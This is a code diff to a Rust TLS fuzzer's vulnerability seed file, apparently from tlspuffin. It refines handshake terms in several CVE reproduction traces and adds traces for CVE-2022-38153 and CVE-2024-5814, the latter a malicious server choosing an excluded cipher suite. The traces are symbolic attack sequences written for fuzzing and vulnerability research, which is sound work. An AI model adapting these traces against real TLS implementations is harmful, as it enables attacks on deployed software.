@@ -40,9 +40,22 @@ pub fn seed_cve_2022_25638(server: AgentName) -> Trace<TLSProtocolTypes> {
                                 ))
                             ))
                         )),
-                        fn_signature_algorithm_extension
+                        (fn_signature_algorithm_extension(
+                            (fn_supported_signature_schemes_extension_append(
+                                (fn_supported_signature_schemes_extension_append(
+                                    fn_supported_signature_schemes_extension_new,
+                                    fn_sig_scheme_rsa_pkcs1_sha256
+                                )),
+                                fn_sig_scheme_rsa_pss_sha256
+                            ))
+                        ))
                     )),
-                    (fn_key_share_deterministic_extension(fn_named_group_secp384r1))
+                    (fn_key_share_extension_make(
+                        (fn_key_share_extension_append(
+                            fn_key_share_extension_new,
+                            (fn_key_share_deterministic(fn_named_group_secp384r1))
+                        ))
+                    ))
                 )),
                 fn_supported_versions13_extension
             ))
@@ -217,9 +230,22 @@ pub fn seed_cve_2022_25640(server: AgentName) -> Trace<TLSProtocolTypes> {
                                 ))
                             ))
                         )),
-                        fn_signature_algorithm_extension
+                        (fn_signature_algorithm_extension(
+                            (fn_supported_signature_schemes_extension_append(
+                                (fn_supported_signature_schemes_extension_append(
+                                    fn_supported_signature_schemes_extension_new,
+                                    fn_sig_scheme_rsa_pkcs1_sha256
+                                )),
+                                fn_sig_scheme_rsa_pss_sha256
+                            ))
+                        ))
                     )),
-                    (fn_key_share_deterministic_extension(fn_named_group_secp384r1))
+                    (fn_key_share_extension_make(
+                        (fn_key_share_extension_append(
+                            fn_key_share_extension_new,
+                            (fn_key_share_deterministic(fn_named_group_secp384r1))
+                        ))
+                    ))
                 )),
                 fn_supported_versions13_extension
             ))
@@ -382,7 +408,7 @@ pub fn seed_cve_2021_3449(server: AgentName) -> Trace<TLSProtocolTypes> {
                 fn_encrypt12(
                     (@renegotiation_client_hello),
                     ((server, 0)),
-                    (fn_decode_ecdh_pubkey(
+                    (fn_decode_server_ecdh_pubkey(
                         ((server, 0)[Some(TlsQueryMatcher::Handshake(Some(HandshakeType::ServerKeyExchange)))]/Vec<u8>) // ServerECDHParams
                     )),
                     fn_named_group_secp384r1,
@@ -401,7 +427,7 @@ pub fn seed_cve_2021_3449(server: AgentName) -> Trace<TLSProtocolTypes> {
                 fn_encrypt12(
                     renegotiation_client_hello,
                     ((server, 0)),
-                    (fn_decode_ecdh_pubkey(
+                    (fn_decode_server_ecdh_pubkey(
                         ((server, 0)[Some(TlsQueryMatcher::Handshake(Some(HandshakeType::ServerKeyExchange)))]/Vec<u8>) // ServerECDHParams
                     )),
                     fn_named_group_secp384r1,
@@ -594,9 +620,22 @@ pub fn seed_cve_2022_25640_simple(server: AgentName) -> Trace<TLSProtocolTypes> 
                                 ))
                             ))
                         )),
-                        fn_signature_algorithm_extension
+                        (fn_signature_algorithm_extension(
+                            (fn_supported_signature_schemes_extension_append(
+                                (fn_supported_signature_schemes_extension_append(
+                                    fn_supported_signature_schemes_extension_new,
+                                    fn_sig_scheme_rsa_pkcs1_sha256
+                                )),
+                                fn_sig_scheme_rsa_pss_sha256
+                            ))
+                        ))
                     )),
-                    (fn_key_share_deterministic_extension(fn_named_group_secp384r1))
+                    (fn_key_share_extension_make(
+                        (fn_key_share_extension_append(
+                            fn_key_share_extension_new,
+                            (fn_key_share_deterministic(fn_named_group_secp384r1))
+                        ))
+                    ))
                 )),
                 fn_supported_versions13_extension
             ))
@@ -768,6 +807,123 @@ pub fn seed_cve_2022_38153(client: AgentName, server: AgentName) -> Trace<TLSPro
     }
 }
 
+// Same as seed_cve_2022_38153 without the final fn_large_bytes_vec, to check whether we refind it
+// through bit-level mutations
+pub fn seed_cve_simple_2022_38153(client: AgentName, server: AgentName) -> Trace<TLSProtocolTypes> {
+    let new_session_ticket_payload = term! {
+        fn_payload_u16(((server, 0)[Some(TlsQueryMatcher::Handshake(Some(HandshakeType::NewSessionTicket)))]/Vec<u8>))
+    };
+
+    let last_term = term! {
+        fn_new_session_ticket(
+            ((server, 0)/u32),
+            (@new_session_ticket_payload)
+        )
+    };
+
+    Trace {
+        prior_traces: vec![],
+        descriptors: vec![
+            TLSDescriptorConfig::new_client(client, TLSVersion::V1_2),
+            TLSDescriptorConfig::new_server(server, TLSVersion::V1_2),
+        ],
+        steps: vec![
+            OutputAction::new_step(client),
+            // Client Hello, Client -> Server
+            InputAction::new_step(
+                server,
+                term! {
+                    fn_client_hello(
+                        ((client, 0)),
+                        ((client, 0)),
+                        ((client, 0)),
+                        ((client, 0)),
+                        ((client, 0)),
+                        ((client, 0))
+                    )
+                },
+            ),
+            // Server Hello, Server -> Client
+            InputAction::new_step(
+                client,
+                term! {
+                        fn_server_hello(
+                            ((server, 0)),
+                            ((server, 0)),
+                            ((client, 0)),
+                            ((server, 0)),
+                            ((server, 0)),
+                            ((server, 0))
+                        )
+                },
+            ),
+            // Server Certificate, Server -> Client
+            Step {
+                agent: client,
+                action: Action::Input(input_action! { term! {
+                        fn_certificate(
+                            ((server, 0))
+                        )
+                    }
+                }),
+            },
+            // Server Key Exchange, Server -> Client
+            Step {
+                agent: client,
+                action: Action::Input(input_action! { term! {
+                        fn_server_key_exchange(
+                            ((server, 0)[Some(TlsQueryMatcher::Handshake(Some(HandshakeType::ServerKeyExchange)))]/Vec<u8>)
+                        )
+                    }
+                }),
+            },
+            // Server Hello Done, Server -> Client
+            Step {
+                agent: client,
+                action: Action::Input(input_action! { term! {
+                        fn_server_hello_done
+                    }
+                }),
+            },
+            // Client Key Exchange, Client -> Server
+            Step {
+                agent: server,
+                action: Action::Input(input_action! { term! {
+                        fn_client_key_exchange(
+                            ((client, 0)[Some(TlsQueryMatcher::Handshake(Some(HandshakeType::ClientKeyExchange)))]/Vec<u8>)
+                        )
+                    }
+                }),
+            },
+            // Client Change Cipher Spec, Client -> Server
+            Step {
+                agent: server,
+                action: Action::Input(input_action! { term! {
+                        fn_change_cipher_spec
+                    }
+                }),
+            },
+            // Client Handshake Finished, Client -> Server
+            // IMPORTANT: We are using here OpaqueMessage as the parsing code in src/io.rs does
+            // not know that the Handshake record message is encrypted. The parsed message from the
+            // could be a HelloRequest if the encrypted data starts with a 0.
+            Step {
+                agent: server,
+                action: Action::Input(input_action! { term! {
+                           (client, 3)[None] > TypeShape::of::<OpaqueMessage>()
+                    }
+                }),
+            },
+            // NewSessionTicket, Server -> Client
+            Step {
+                agent: client,
+                action: Action::Input(input_action! { last_term }),
+            },
+        ],
+        ..Default::default()
+    }
+}
+
 pub fn seed_cve_2022_39173(
     initial_server: AgentName,
     server: AgentName,
@@ -831,11 +987,24 @@ pub fn seed_cve_2022_39173(
                                 // CHANGED from:     (fn_support_group_extension(fn_named_group_secp384r1))
                                 // CHANGED from: )),
                                 // ^ lacks of the above makes the server enter a `SERVER_HELLO_RETRY_REQUEST_COMPLETE` state
-                                fn_signature_algorithm_extension
+                                (fn_signature_algorithm_extension(
+                                    (fn_supported_signature_schemes_extension_append(
+                                        (fn_supported_signature_schemes_extension_append(
+                                            fn_supported_signature_schemes_extension_new,
+                                            fn_sig_scheme_rsa_pkcs1_sha256
+                                        )),
+                                        fn_sig_scheme_rsa_pss_sha256
+                                    ))
+                                ))
                             )),
                             fn_supported_versions13_extension
                         )),
-                        (fn_key_share_deterministic_extension(fn_named_group_secp384r1))
+                        (fn_key_share_extension_make(
+                            (fn_key_share_extension_append(
+                                fn_key_share_extension_new,
+                                (fn_key_share_deterministic(fn_named_group_secp384r1))
+                            ))
+                        ))
                     )),
                     fn_psk_exchange_mode_dhe_ke_extension
                 )),
@@ -974,11 +1143,24 @@ pub fn seed_cve_2022_39173_full(
                                 // CHANGED from:     fn_client_extensions_new,
                                 // CHANGED from:     (fn_support_group_extension(fn_named_group_secp384r1))
                                 // CHANGED from: )),
-                                fn_signature_algorithm_extension
+                                (fn_signature_algorithm_extension(
+                                    (fn_supported_signature_schemes_extension_append(
+                                        (fn_supported_signature_schemes_extension_append(
+                                            fn_supported_signature_schemes_extension_new,
+                                            fn_sig_scheme_rsa_pkcs1_sha256
+                                        )),
+                                        fn_sig_scheme_rsa_pss_sha256
+                                    ))
+                                ))
                             )),
                             fn_supported_versions13_extension
                         )),
-                        (fn_key_share_deterministic_extension(fn_named_group_secp384r1))
+                        (fn_key_share_extension_make(
+                            (fn_key_share_extension_append(
+                                fn_key_share_extension_new,
+                                (fn_key_share_deterministic(fn_named_group_secp384r1))
+                            ))
+                        ))
                     )),
                     fn_psk_exchange_mode_dhe_ke_extension
                 )),
@@ -1106,11 +1288,24 @@ pub fn seed_cve_2022_39173_minimized(server: AgentName) -> Trace<TLSProtocolType
                                 // CHANGED from:     (fn_support_group_extension(fn_named_group_secp384r1))
                                 // CHANGED from: )),
                                 // ^ lacks of the above makes the server enter a `SERVER_HELLO_RETRY_REQUEST_COMPLETE` state
-                                fn_signature_algorithm_extension
+                                (fn_signature_algorithm_extension(
+                                    (fn_supported_signature_schemes_extension_append(
+                                        (fn_supported_signature_schemes_extension_append(
+                                            fn_supported_signature_schemes_extension_new,
+                                            fn_sig_scheme_rsa_pkcs1_sha256
+                                        )),
+                                        fn_sig_scheme_rsa_pss_sha256
+                                    ))
+                                ))
                             )),
                             fn_supported_versions13_extension
                         )),
-                        (fn_key_share_deterministic_extension(fn_named_group_secp384r1))
+                        (fn_key_share_extension_make(
+                            (fn_key_share_extension_append(
+                                fn_key_share_extension_new,
+                                (fn_key_share_deterministic(fn_named_group_secp384r1))
+                            ))
+                        ))
                     )),
                     fn_psk_exchange_mode_dhe_ke_extension
                 )),
@@ -1147,9 +1342,182 @@ pub fn seed_cve_2022_39173_minimized(server: AgentName) -> Trace<TLSProtocolType
     }
 }
 
+/// <https://nvd.nist.gov/vuln/detail/CVE-2024-5814>
+pub fn seed_cve_2024_5814(client: AgentName) -> Trace<TLSProtocolTypes> {
+    let selected_cipher_suite = term! { fn_excluded_cipher_suite };
+    let server_hello = term! {
+        fn_server_hello(
+            fn_protocol_version12,
+            fn_new_random,
+            ((client, 0)[Some(TlsQueryMatcher::Handshake(Some(HandshakeType::ClientHello)))]),
+            (@selected_cipher_suite),      // Using a cipher not in configuration cipher string
+            fn_compression,
+            (fn_server_extensions_make(
+                (fn_server_extensions_append(
+                    fn_server_extensions_new,
+                    (fn_renegotiation_info_server_extension((fn_payload_u8(fn_empty_bytes_vec))))
+            ))))
+        )
+    };
+
+    let server_hello_transcript = term! {
+        fn_append_transcript(
+            (fn_append_transcript(
+                fn_new_transcript12,
+                ((client, 0)[Some(TlsQueryMatcher::Handshake(Some(HandshakeType::ClientHello)))]) // ClientHello
+            )),
+            (@server_hello) // plaintext ServerHello
+        )
+    };
+
+    let server_certificate = term! {
+        fn_certificate(
+            (fn_append_certificate(
+                fn_new_certificates,
+                (fn_certificate_from_vec_u8(fn_alice_cert))
+            ))
+        )
+    };
+
+    let certificate_transcript = term! {
+        fn_append_transcript(
+            (@server_hello_transcript),
+            (@server_certificate)
+        )
+    };
+
+    let server_key_exchange = term! {
+        fn_server_key_exchange(
+            (fn_sign_rsa_ecdhe_server_key_exchange12(
+                fn_named_group_secp384r1,
+                ((client, 0)),
+                fn_new_random,
+                fn_alice_key
+            ))
+        )
+    };
+
+    let server_key_exchange_transcript = term! {
+      fn_append_transcript(
+            (@certificate_transcript),
+            (@server_key_exchange)
+        )
+    };
+
+    let server_hello_done_transcript = term! {
+      fn_append_transcript(
+            (@server_key_exchange_transcript),
+            (fn_server_hello_done)
+        )
+    };
+
+    let client_key_exchange_transcript = term! {
+        fn_append_transcript(
+            (@server_hello_done_transcript),
+            ((client, 0)[Some(TlsQueryMatcher::Handshake(Some(HandshakeType::ClientKeyExchange)))])
+        )
+    };
+
+    let client_ecdh_pubkey = term! {
+        fn_decode_client_ecdh_pubkey(
+            ((client, 0)[Some(TlsQueryMatcher::Handshake(Some(HandshakeType::ClientKeyExchange)))]/Vec<u8>) // ClientECDHParams
+        )
+    };
+
+    let client_finished_transcript = term! {
+        fn_append_transcript(
+            (@client_key_exchange_transcript),
+            (fn_decrypt12( // Decrypt client finished
+                ((client, 0)[Some(TlsQueryMatcher::Handshake(None))]), //EncryptedHandshake
+                fn_new_random,
+                (@client_ecdh_pubkey),
+                fn_named_group_secp384r1,
+                fn_false,
+                fn_seq_0,
+                ((client, 0)),
+                (@selected_cipher_suite)
+            ))
+        )
+    };
+
+    let server_verify_data = term! {
+        fn_server_sign_transcript(
+            fn_new_random,
+            (@client_ecdh_pubkey),
+            (@client_finished_transcript),
+            fn_named_group_secp384r1,
+            ((client, 0)),
+            (@selected_cipher_suite)
+        )
+    };
+
+    Trace {
+        prior_traces: vec![],
+        descriptors: vec![TLSDescriptorConfig::new_client(client, TLSVersion::Both)],
+        steps: vec![
+            // Client Hello, Client -> Server
+            OutputAction::new_step(client),
+            // Server Hello, Server -> Client
+            Step {
+                agent: client,
+                action: Action::Input(input_action! { server_hello
+                }),
+            },
+            // Server Certificate, Server -> Client
+            Step {
+                agent: client,
+                action: Action::Input(input_action! { server_certificate
+                }),
+            },
+            // Server Key Exchange, Server -> Client
+            Step {
+                agent: client,
+                action: Action::Input(input_action! { server_key_exchange
+                }),
+            },
+            // Server Hello Done, Server -> Client
+            Step {
+                agent: client,
+                action: Action::Input(input_action! { term! { fn_server_hello_done }
+                }),
+            },
+            // Output messages from Client:
+            // Client Key Exchange, Client -> Server
+            // Client Change Cipher Spec, Client -> Server
+            // Client Finished, Client -> Server
+
+            // Server Change Cipher Spec, Server -> Client
+            Step {
+                agent: client,
+                action: Action::Input(input_action! { term! { fn_change_cipher_spec }
+                }),
+            },
+            // Server Finished, Server -> Client
+            Step {
+                agent: client,
+                action: Action::Input(input_action! { term! {
+                        fn_encrypt12(
+                            (fn_finished((@server_verify_data))),
+                            fn_new_random,
+                            (@client_ecdh_pubkey),
+                            fn_named_group_secp384r1,
+                            fn_false,
+                            fn_seq_0,
+                            ((client, 0)),
+                            (@selected_cipher_suite)
+                        )
+                    }
+                }),
+            },
+        ],
+        ..Default::default()
+    }
+}
+
 #[cfg(test)]
 pub mod tests {
     use puffin::algebra::TermType;
+    use puffin::fuzzer::utils::TermConstraints;
 
     #[allow(unused_imports)]
     use crate::{test_utils::prelude::*, tls::vulnerabilities::*};
@@ -1178,7 +1546,7 @@ pub mod tests {
                         // max_term_size in fuzzer setup
                         let terms = input.recipe.size();
                         assert!(
-                            terms < 300,
+                            terms < TermConstraints::default().max_term_size_explore,
                             "{} has step with too large term size {}!",
                             name,
                             terms
